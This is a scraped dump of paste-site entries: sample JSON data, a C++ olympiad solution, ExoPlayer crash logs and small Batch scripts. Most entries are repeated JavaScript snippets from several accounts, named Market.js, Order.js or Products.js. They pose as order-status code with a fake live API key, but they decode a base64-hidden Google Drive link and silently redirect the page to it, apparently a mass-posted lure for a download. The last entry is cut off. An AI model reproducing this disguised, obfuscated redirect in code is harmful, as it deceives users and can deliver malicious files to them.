		let users = [{""id"":1,""name"":""Thomas"",""email"":""thomas.smith@gmail.com"",""age"": 22,""city"":""New York""},{""id"":2,""name"":""Emma"",""email"":""emma.j@gmail.com"",""age"": 31, ""city"":""Chicago""},{""id"":3,""name"":""Michael"",""email"":""michael.b@gmail.com"",""age"": 46, ""city"":""New York""},{""id"":4,""name"":""Sarah"",""email"":""sarah.d@gmail.com"",""age"": 18,""city"":""Los Angeles""},{""id"":5,""name"":""Robert"",""email"":""robert.w@gmail.com"",""age"": 21,""city"":""Chicago""},{""id"":6,""name"":""Jessica"",""email"":""jessica.m@gmail.com"",""age"": 32,""city"":""Houston""},{""id"":7,""name"":""David"",""email"":""david@gmail.com"",""age"": 19, ""city"":""Phoenix""},{""id"":8,""name"":""Jennifer"",""email"":""jennifer.t@gmail.com"",""age"": 35,""city"":""Los Angeles""},{""id"":9,""name"":""Peter"",""email"":""peter@gmail.com"",""age"": 22, ""city"":""New York""},{""id"":10,""name"":""Lisa"",""email"":""lisa@gmail.com"",""age"": 46, ""city"":""Chicago""}];
		let games = [{""title"":""The Witcher 3: Wild Hunt"",""genre"":""Action RPG"",""characters"":{""protagonist"":{""name"":""Geralt of Rivia"",""role"":""Witcher"",""signatureAbility"":""Igni fire magic""},""antagonist"":{""name"":""Eredin"",""role"":""King of the Wild Hunt"",""signatureAbility"":""Dimensional travel""},""companion"":{""name"":""Ciri"",""role"":""The Lion Cub of Cintra"",""signatureAbility"":""Elder Blood powers""}}},{""title"":""Overwatch 2"",""genre"":""Hero Shooter"",""characters"":{""damage"":{""name"":""Tracer"",""role"":""Time-jumping adventurer"",""signatureAbility"":""Blink teleport""},""tank"":{""name"":""Reinhardt"",""role"":""Crusader knight"",""signatureAbility"":""Rocket Hammer""},""support"":{""name"":""Mercy"",""role"":""Guardian angel"",""signatureAbility"":""Caduceus Staff healing""}}},{""title"":""Street Fighter 6"",""genre"":""Fighting"",""characters"":{""legend"":{""name"":""Ryu"",""role"":""Wandering warrior"",""signatureAbility"":""Hadouken fireball""},""newcomer"":{""name"":""Luke"",""role"":""MMA fighter"",""signatureAbility"":""Sand Blast punch""},""villain"":{""name"":""M. Bison"",""role"":""Dictator"",""signatureAbility"":""Psycho Crusher""}}}];
	</script>
</head>
<body>
	
</body>
</html>"
sm9mjxZQ,Products.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 04:53:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69073/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YAhkL7q6,Order.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 04:37:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95251/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
skT1QBE0,Market.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 04:22:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35181/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
J7bs9WtN,Untitled,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 04:07:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49643/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FbUiKmqC,Market.js,hubertzoo90,JavaScript,Wednesday 9th of April 2025 03:51:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42542/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
shRyH6Nw,Untitled,hubertzoo90,JavaScript,Wednesday 9th of April 2025 03:35:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23471/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kvqtz7m7,Олимпијада (мои '16),PlanttPastes,C++,Wednesday 9th of April 2025 03:29:49 PM CDT,"#include <bits/stdc++.h>
using namespace std;
#pragma GCC optimize(""O2,O3,Ofast,unroll-loops"")

const int N = 107308, inf = 1797710308;
int n, L, H, s;
vector <pair <int, int>> g[N];
int sgt[3 * N], subtsize[N];
bool resetsgt[3 * N], visited[N];

void sgtupdate(int q, int val, int node, int cl, int cr) {
	if (q < cl || cr < q) return;
	if (resetsgt[node]) {
		if (node < s) resetsgt[2 * node + 1] = resetsgt[2 * node + 2] = true;
		sgt[node] = -inf;
		resetsgt[node] = false;
	}
	if (q == cl && q == cr) {
		sgt[node] = max(sgt[node], val);
		return;
	}
	int cm = cl + cr >> 1;
	sgtupdate(q, val, 2 * node + 1, cl, cm);
	sgtupdate(q, val, 2 * node + 2, cm + 1, cr);
	sgt[node] = max(resetsgt[2 * node + 1] ? -inf : sgt[2 * node + 1], resetsgt[2 * node + 2] ? -inf : sgt[2 * node + 2]);
}
int sgtget(int ql, int qr, int node, int cl, int cr) {
	if (qr < cl || cr < ql) return -inf;
	if (resetsgt[node]) return -inf;
	if (ql <= cl && cr <= qr) return sgt[node];
	int cm = cl + cr >> 1;
	return max(sgtget(ql, qr, 2 * node + 1, cl, cm), sgtget(ql, qr, 2 * node + 2, cm + 1, cr));
}
int &calcsubt(const int &node, const int &parent) {
	subtsize[node] = 1;
	for (auto &[neigh, _] : g[node]) {
		if (visited[neigh] || neigh == parent) continue;
		subtsize[node] += calcsubt(neigh, node);
	}
	return subtsize[node];
}
bool querydfs(const int &node, const int &parent, const int &depth, const int &val, const int &median) {
	if (sgtget(L - depth, H - depth, 0, 0, s) + val >= 0) {
		// cerr << ""FOUND IT!\n"";
		return true; // NAJDOVME!! se vrakame do binary searchot
	}
	for (auto &[child, w] : g[node]) {
		if (child == parent || visited[child]) continue;
		if (querydfs(child, node, depth + 1, val + (w >= median ? 1 : -1), median)) return true;
	}
	return false;
}
void updatedfs(const int &node, const int &parent, const int &depth, const int &val, const int &median) {
	sgtupdate(depth, val, 0, 0, s);
	for (auto &[child, w] : g[node]) {
		if (child == parent || visited[child]) continue;
		updatedfs(child, node, depth + 1, val + (w >= median ? 1 : -1), median);
	}
}
pair <int, int> findcentroid(int node) {
	int sz = subtsize[node] / 2, parent = -1;
	bool cont = true;
	while (cont) {
		cont = false;
		for (auto &[neigh, _] : g[node]) {
			if (!visited[neigh] && neigh != parent && subtsize[neigh] > sz) {
				cont = true;
				parent = node;
				node = neigh;
				break;
			}
		}
	}
	return {node, parent};
}
bool searchpath(const int &root, const int &median) {
	if (visited[root]) return false;
	auto [centroid, centparent] = findcentroid(root);
	visited[centroid] = true;
	resetsgt[0] = true;
	sgtupdate(0, 0, 0, 0, s);
	for (auto &[neigh, w] : g[centroid]) {
		if (visited[neigh]) continue;
		if (querydfs(neigh, centroid, 1, w >= median ? 1 : -1, median)) {
			// cerr << ""FOUND!! "" << centroid << ' ' << neigh << ' ' << median << '\n';
			return true;
		}
		updatedfs(neigh, centroid, 1, w >= median ? 1 : -1, median);
	}
	if (centparent >= 0) calcsubt(centparent, -1);
	for (auto &[neigh, _] : g[centroid]) {
		if (searchpath(neigh, median)) return true;
	}
	return false;
}
// Dali postoi pat so medijana >= median
bool ok(int median) {
	memset(visited, 0, n * sizeof(bool));
	calcsubt(0, -1);
	return searchpath(0, median);
}
signed main() {
	ios::sync_with_stdio(0);
	cin.tie(0); cout.tie(0);
	cin >> n >> L >> H;
	s = (1 << int(ceil(log2(n + 5)))) - 1;
	for (int i = 1, a, b, w; i < n; i++) {
		cin >> a >> b >> w;
		g[--a].push_back({--b, w});
		g[b].push_back({a, w});
	}
	int l = 0, r = 15e8, m;
		while (r - l > 1) {
		m = l + r >> 1;
		if (ok(m)) l = m;
		else r = m;
	}
	// cerr << l << ' ' << r;
	cout << (l != r && ok(r) ? r : l);
}"
m8VVBkDh,Products.js,hubertzoo90,JavaScript,Wednesday 9th of April 2025 03:20:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13022/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
13jwcusx,Order.js,hubertzoo90,JavaScript,Wednesday 9th of April 2025 03:04:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42240/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LMZVZEd3,2025-04-09T22:04:46.699635,powerampache,PHP,Wednesday 9th of April 2025 03:04:47 PM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":12},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":3280853167,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
egXZv1Dv,2025-04-09T22:04:46.525919,powerampache,PHP,Wednesday 9th of April 2025 03:04:46 PM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loopOnce(Looper.java:249)
	at android.os.Looper.loop(Looper.java:337)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":11},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":3280852919,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":249,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":337,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
H1mqv4D3,Market.js,hubertzoo90,JavaScript,Wednesday 9th of April 2025 02:49:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64594/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3BXFVNsB,Untitled,hubertzoo90,JavaScript,Wednesday 9th of April 2025 02:34:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49512/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Hw8fZ6ZG,windows 3 pytania,ENCIOK,Batch,Wednesday 9th of April 2025 02:25:32 PM CDT,"@echo off
chcp 65001

set /p ""odp=pyt:""
if %odp%==ans (
    echo igor
) ELSE (
    echo bryk
)

set /p ""odp=pyt:""
if %odp%==ans (
    echo igor
) ELSE (
    echo bryk
)

set /p ""odp=pyt:""
if %odp%==ans (
    echo igor
) ELSE (
    echo bryk
)

pause"
5ftZRgwx,Market.js,zebmekey,JavaScript,Wednesday 9th of April 2025 02:17:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84404/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8SAXfhpC,windows wybory,ENCIOK,Batch,Wednesday 9th of April 2025 02:04:28 PM CDT,"@echo off
chcp 65001

:while
cls
    echo ""opcje opcje opcje opcje""
    set /p ""wybor=: ""
    if %wybor%==1 (
        wow
    )
    if %wybor%==2 (
        wow
    )
    if %wybor%==3 (
        wow
    )
    if %wybor%==4 (
        goto :endloop
    )

goto :while

:endloop"
NpXsRH5T,Untitled,zebmekey,JavaScript,Wednesday 9th of April 2025 02:02:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48797/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
